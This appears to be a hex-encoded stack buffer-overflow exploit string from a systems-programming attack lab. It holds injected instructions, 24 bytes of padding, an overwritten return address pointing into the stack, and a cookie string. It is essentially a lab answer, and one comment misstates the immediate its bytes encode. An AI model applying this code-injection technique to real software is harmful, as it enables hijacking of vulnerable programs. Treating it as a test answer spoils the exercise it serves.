
48 c7 c7 48 9f 62 55 	/* mov    $0x55629f60%rdi */
68 3f 19 40 00       	/* pushq  $0x40193f */
c3                   	/* retq */   
11 11 11 11 11 11 11 11 /* eat up the buffer up to 24bytes */
11 11 11             
28 9f 62 55 00 00 00 00 /* addr of $rsp */

33 65 35 32 64 66 66 35 /* char* string */
00
